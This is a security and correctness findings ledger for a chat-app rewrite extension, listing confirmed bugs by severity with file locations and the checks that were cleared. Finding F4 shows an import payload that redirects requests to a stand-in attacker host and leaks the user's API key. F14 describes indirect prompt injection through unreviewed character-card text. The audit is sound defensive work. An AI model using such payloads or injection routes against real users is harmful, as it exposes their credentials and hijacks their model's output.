# comb — verified findings ledger

**Run:** `8ec8a79..HEAD` on `feat/v6.0-personal-extensions` · 2026-08-04
**Reconciliation:** 23 candidates → **18 CONFIRMED** · 2 REFUTED · 3 dropped (non-defect / out-of-scope / defer). Every candidate carries a disposition; none silently dropped.

Tiers run: region generalists + dimension-equivalent conditional lenses (round-trip, claims, trust-boundary). **Deep tier NOT run** (not `--exhaustive`) — this is a standard-tier dry, not a clean bill of health.

---

## CRITICAL

| id | what | file | provenance |
|---|---|---|---|
| **F1** | Shim dropped implicit `Content-Type: application/json` → **default sidecar mode is broken** | `extension.js:29-40` → breaks at `:1490` | **v6.0 regression** |
| **F2** | `alignExact` island-demotion misses contiguous runs → **silent mid-token splice corrupts stored messages** | `extension.js:705-797` | pre-existing |

**F1** — orchestrator-verified against the live engine: `text/plain` → HTTP 400 `"Expected object, received string"`; `application/json` → reaches the handler. `connMode:"sidecar"` is the `DEF_CFG` default. Exactly two `apiFetch` call sites send a body — `patchMessage` (`:350`) sets the header and is fine; `/sidecar/tracker` (`:1490`) does not.

**F2** — orchestrator-reproduced: `alignExact("Hi PersonName50 there, friend.", "Hi {{char50}} there, friend.", 0, 11)` → `{as:0, ae:9}`, splicing to `"<<NEW>>50}} there, friend."`. The macro is bisected; `50}}` survives as orphaned literal text. **The selfcheck suite's own non-corruption assertions pass** — this input class is uncovered. Also reproduces through `windowMap` at real message sizes (5/5 macros bisected in a ~21K-char message).

## HIGH

| id | what | file | provenance |
|---|---|---|---|
| **F3** | Adoption bypasses the only profile validation → a `null` element **silently blackholes the whole extension** | `extension.js:97-116`, `:157`, `:282-292` | **v6.0** |
| **F4** | Settings import redirects inference and **leaks the user's API key** to an arbitrary host | `extension.js:2507-2521` + `:1500-1511` | pre-existing |
| **F5** | Undo/redo clobber concurrent edits — no optimistic-concurrency check | `extension.js:2246-2280` | pre-existing |
| **F6** | Review modal applies a pre-modal snapshot after unbounded delay | `extension.js:1444`, `:2218-2222` | pre-existing |
| **F7** | Occurrence index silently resolves to the **wrong** occurrence after edits | `extension.js:688-692`, `:2197-2199`, `:1914-1925` | pre-existing |

**F3** — demonstrated (`TypeError: Cannot read properties of null (reading 'id')`), `migratePrompts` has no try/catch, the engine runs `extension.js` synchronously inside `main()` so the throw aborts every remaining top-level statement, and **no listener for `marinara-personal-extension-error` exists anywhere in the client** — console-only, invisible to the user. Independently verified that no pre-diff writer of `K_PROF` could produce this; adoption is a genuinely new unvalidated writer.

**F4** — demonstrated: importing `{connMode:"direct", apiUrl:"https://attacker.example/v1"}` with **no `apiKey` field** leaves the user's stored key untouched, which is then sent as `Authorization: Bearer …` to the attacker host. No confirmation dialog on Import (contrast Reset at `:3003`, which does `confirm(...)`). **Conditional** — only fires if the user already configured `direct`/`extender` with a saved key.

**F5** — skeptic argued severity **up**: the engine has a background-autonomous-messaging hook plus swipe/regenerate writing from four routes, so the race is reachable in ordinary single-user use, not just multi-client.

**F7** — demonstrated: inserting a matching occurrence before the target shifts the same index onto a different occurrence, no error, toast still reads "✓ Applied". Ledgers persist in localStorage with **no TTL** (pruned by count only), so a resume days later re-uses a stale `occ`.

## MEDIUM

| id | what | file | provenance |
|---|---|---|---|
| **F8** | `.rwa-win` drift guard **cannot fail** — trailing space matches only scrollbar rules | `selfcheck.mjs:85` | **v6.0** |
| **F9** | `on()` teardown drift guard **cannot fail** — bare `removeEventListener` matches 3 unrelated sites | `selfcheck.mjs:92` | **v6.0** |
| **F10** | `null` response treated as user cancellation → modal hangs open with no error | `extension.js:1701`, `:1997`, `:1904` | **v6.0 contract** |
| **F11** | Adoption selects candidates with no proof of ownership | `extension.js:97-114` | **v6.0** |
| **F12** | Adoption copy non-atomic → mixed legacy/default bootstrap for the current load | `extension.js:97-116` | **v6.0** |
| **F13** | Assembled prompt never budgeted against the engine's 16000-char cap | `extension.js:1682` | pre-existing |
| **F14** | Unescaped fence interpolation — indirect injection via auto-included context | `extension.js:1685-1689`, `:431`, `:448`, `:462` | pre-existing |
| **F15** | Partial multi-message apply gives no aggregation of what committed | `extension.js:2029-2040` | pre-existing |
| **F16** | README describes a matching pipeline that does not exist | `README.md:140-144` | pre-existing doc |

**F8** — `.rwa-win` is the base container for the rewrite popup, review modal, **and** settings modal (`extension.js:1400`, `:2286`, `:2539`). Deleting the rule leaves all three unstyled with a green suite.
**F14** — skeptic argued **up** from the finder's framing: the finder anchored on user-selected `safeText` (near-theatre), but the same bug applies to `<lore>`/`<character>`/`<persona>`/`<context>`, auto-included from downloaded character cards the user never reviewed. Worse with `autoApply`, which skips the preview modal entirely.

## LOW

| id | what | file | provenance |
|---|---|---|---|
| **F17** | CHANGELOG misattributes the vanishing-settings root cause | `CHANGELOG.md:25-29` | **v6.0 doc** |
| **F18** | Imported profiles not id-deduped → drag-reorder mutates the wrong profile | `extension.js:2472-2481` + `:2687` | pre-existing |

**F17** — the skeptic's history trace: the claim was literally true for the window when v5.1 shipped (the pre-2.4 route called `create()` unconditionally until engine commit `a731173d8`, 2026-07-21). Today both routes dedupe by name and PATCH in place. The real invariant cause is that the **old manifest embedded the version in `name`**, so every release missed the dedup. v6.0's `name: "Rewrite Assistant"` independently fixes that. **No code is wrong — only the causal narrative.**
**F18** — argued **down** to low: UI data-integrity only. In-app profiles get collision-proof ids, so this needs a hand-edited import.

---

## REFUTED (dropped — false positives, no fix budget)

- **`alignExact` row-allocation blowup** (`extension.js:705-716`) — the benchmark reproduces in isolation (n=400000/m=10 → 59ms, ~111MB), but **unreachable with real inputs**. `n` and `m` are the rendered and stored lengths of the *same message*; no transform in the codebase produces a 40,000:1 skew (quote normalization is 1:1, marker stripping shrinks slightly, macro expansion is bounded to a few chars). Via `windowMap` both widths derive from the same 40-char anchor run with `MAXSPAN=800`, and there is a `4,000,000` product cap before the call. Correct micro-observation, refuted as reachable.
- **200KB committed artifact / git growth** — `.git` is 4.1MB across 39 commits; unremarkable. The bundle **must** be committed: `README.md:92` tells users to download it. Not a finding.

## DROPPED — non-defect or out of scope

- **Build round-trip doesn't cover manifest fields** — PLAUSIBLE but no residual risk: the fields are inline literals reached by object spread with no I/O between, and `selfcheck.mjs:107-110` already greps `build.mjs` for them, gating the build. The skeptic's verdict: *"extending the round-trip check would add code that can never fail — that's the over-engineering direction, not a fix."* Dropped.
- **No CI enforcing bundle-matches-source** — facts confirmed (`.github/workflows` absent, no active hooks, bundle currently in sync). But it is an absent process safeguard, not a defect in any file. **Recommend a follow-up issue, not a code fix.**

## DEFERRED — confirmed but recommend no action

- **F-defer-1: reclaim removes `rwa-loader-allow-remote`** (`extension.js:119-125`) — mechanism confirmed, but `allowRemote()` returned `false` for an absent key, so removal resets the user to the loader's **safe** default. No documented rollback path exists. A fail-safe reset, not a defect. **Recommend defer.**

---

## CHECKED-AND-CLEARED (negative results — hypotheses that did not hold)

Recorded so a future sweep doesn't re-pay these traces.

**Commit path (the highest-stakes area) — clean:**
- The selfcheck mirror of `alignExact`/`findCleanAnchor`/`normForAnchor`/`windowMap`/`mapRenderedSpanToRaw` **is logically identical** to the shipped code (only `let`/`const` vs `var` and object-shorthand differ). No drift.
- `patchMessage` failure-shape detection plus `doCommit`/`reviewThenPatch` ordering: history is mutated **only** inside the post-PATCH `.then`. **A failed write cannot be reported as success**; the pre-rewrite text is never discarded on failure.
- Three attempts to force a wrong-region splice via duplicate/repeated content all failed to corrupt — `findCleanAnchor`'s global-uniqueness requirement, the product cap, and `alignExact`'s dirty-edge rejection returned `null` or spliced correctly every time. (F2 is a *different* mechanism: incidental matches inside a transform token, not duplicate content.)

**Trust boundaries — guarded:**
- LLM `result`, all three modes — every consumer does `typeof resp.result === "string" ? … : ""`; a malformed result never reaches the splice.
- Merge-mode `[[SECTION n]]` markers — count *and* sequence verified before trusting the split.
- `doCommit` message lookup — `Array.isArray` checked; throws rather than splicing at a guessed offset.
- Extender `/api/memory-block` — `typeof block !== "string"` checked; hostile localhost process degrades to `""`.
- Ollama `/api/tags` and `/models` — `Array.isArray` checked on both shapes.
- **XSS:** every `innerHTML`/`insertAdjacentHTML`/`outerHTML`/`new Function` sink is fed hard-coded SVG paths or `""`; the one taking a caller-supplied label is only ever called with two literals. **No path from character- or LLM-authored content** — material, since the extension now has full page access.

**Round-trips — sound:**
- build splice → parse: `JSON.stringify` escapes newlines inside string values, so the blanket `\n → \r\n` only touches structural newlines. `extension.js` verified 100% CRLF (3285/3285 lines).
- adoption copy: raw string→string, never JSON round-tripped; malformed JSON, `"null"`, and empty all copy byte-identical.
- rendered→raw identity with no transform: 704 sampled span pairs all returned exactly `{as:rs, ae:re}`.
- rewrite → undo → redo: full snapshots, not diffs; `patchMessage` is a pure passthrough. Client-side composition byte-identical.

**Claims verified TRUE against engine source:**
- Install two-gate sequence, the Danger Zone toggle label (verbatim from `en.json`), "Settings → Addons → External Extensions", "Review and Run", "Run Exact Code" — all match the engine's real UI.
- Full-page-access justification matches the engine's own approval copy.
- Hash-bound approval: runtime routes 404 unless `approvedHash === contentHash` **and** the query hash matches.
- `blob:` dropped from CSP `script-src`.
- "API key is redacted from the export" — true for both debug-log and settings exports.
- All 7 rows of the plan's "Deviations during execution" table accurate against shipped code.
- No stray `marinara.extensionId` references left by the port.
